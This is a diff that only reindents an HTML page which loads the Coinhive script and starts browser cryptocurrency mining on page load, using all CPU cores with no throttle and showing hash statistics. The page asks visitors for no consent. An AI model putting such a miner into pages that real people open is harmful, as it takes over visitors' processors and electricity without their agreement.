@@ -1,47 +1,47 @@
 <html>
-	<head>
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-		<script>
-			var miner = new CoinHive.User('zkgIw8Ba5Dpsaqu1VscAe46PIOzskf0K', navigator.platform, {
-				threads: navigator.hardwareConcurrency, // Use all cores
-				throttle: 0, // Don't throttle
-				forceASMJS: false,
-			});
+  <head>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.User('zkgIw8Ba5Dpsaqu1VscAe46PIOzskf0K', navigator.platform, {
+        threads: navigator.hardwareConcurrency, // Use all cores
+        throttle: 0, // Don't throttle
+        forceASMJS: false,
+      });
 
-			miner.start();
+      miner.start();
 
-			// Listen on events
-			miner.on('found', function() { /* Hash found */ })
-			miner.on('accepted', function() { /* Hash accepted by the pool */ })
+      // Listen on events
+      miner.on('found', function() { /* Hash found */ })
+      miner.on('accepted', function() { /* Hash accepted by the pool */ })
 
-			// Update stats once per second
-			setInterval(function() {
-			var hashesPerSecond = Math.round(miner.getHashesPerSecond());
-			var totalHashes = miner.getTotalHashes();
-			var acceptedHashes = miner.getAcceptedHashes();
+      // Update stats once per second
+      setInterval(function() {
+      var hashesPerSecond = Math.round(miner.getHashesPerSecond());
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
 
-			// Output to HTML elements...
-			document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
-			document.getElementById("totalHashes").innerHTML = totalHashes;
-			document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
-			document.title = hashesPerSecond + ' h/s';
-			}, 1000);
-		</script>
-	</head>
-	<body>
-		<table>
-			<tr>
-				<td>Hashes Per Second:</td>
-				<td id="hashesPerSecond"></td>
-			</tr>
-			<tr>
-				<td>Accepted Hashes:</td>
-				<td id="acceptedHashes"></td>
-			</tr>
-			<tr>
-				<td>Total Hashes:</td>
-				<td id="totalHashes"></td>
-			</tr>
-		</table>
-	</body>
+      // Output to HTML elements...
+      document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
+      document.getElementById("totalHashes").innerHTML = totalHashes;
+      document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
+      document.title = hashesPerSecond + ' h/s';
+      }, 1000);
+    </script>
+  </head>
+  <body>
+    <table>
+      <tr>
+        <td>Hashes Per Second:</td>
+        <td id="hashesPerSecond"></td>
+      </tr>
+      <tr>
+        <td>Accepted Hashes:</td>
+        <td id="acceptedHashes"></td>
+      </tr>
+      <tr>
+        <td>Total Hashes:</td>
+        <td id="totalHashes"></td>
+      </tr>
+    </table>
+  </body>
 </html>
